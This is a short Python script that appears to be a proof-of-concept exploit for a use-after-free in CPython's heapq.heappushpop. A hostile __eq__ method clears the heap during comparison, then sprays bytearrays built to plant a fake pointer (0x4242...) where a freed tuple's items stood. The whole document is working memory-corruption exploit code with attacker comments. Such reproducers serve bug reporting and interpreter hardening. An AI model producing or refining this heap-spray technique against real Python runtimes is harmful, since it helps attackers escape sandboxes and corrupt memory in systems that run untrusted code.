import heapq

class Evil1:
    def __eq__(self, other):
        # Fill tuple free list
        dummy = [(i, i) for i in range(10000)]
        del dummy
        
        # Free top
        heap.clear()
        
        # We spray bytearray of size 31 (alloc = 32)
        # We set index 16..23 to 0 (so ob_item[0] if it's there)
        # We set index 24..31 to our fake pointer
        
        fake_pointer = (0x4242424242424242).to_bytes(8, 'little')
        
        payload = b'A'*16 + (0).to_bytes(8, 'little') + fake_pointer[:7]
        
        global spray
        spray = [bytearray(payload) for _ in range(10000)]
        
        return True

class Evil2:
    def __gt__(self, other):
        return True

heap = [(Evil1(), 0)]

try:
    heapq.heappushpop(heap, (0, Evil2()))
except Exception as e:
    pass
print("Done")
